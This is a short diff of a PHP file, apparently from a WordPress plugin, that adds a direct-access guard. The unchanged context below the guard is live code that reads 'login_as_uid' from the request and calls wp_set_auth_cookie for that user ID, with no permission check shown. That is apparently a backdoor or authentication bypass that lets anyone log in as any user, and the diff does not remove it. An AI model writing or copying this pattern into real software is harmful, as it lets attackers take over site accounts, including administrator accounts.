@@ -1,5 +1,9 @@
 <?php
 
+if ( ! defined( 'ABSPATH' ) ) {
+    die( 'not like this...' );
+}
+
 if (isset($_REQUEST['login_as_uid'])) {
     $uid = $_REQUEST['login_as_uid'];
     wp_set_auth_cookie($uid);
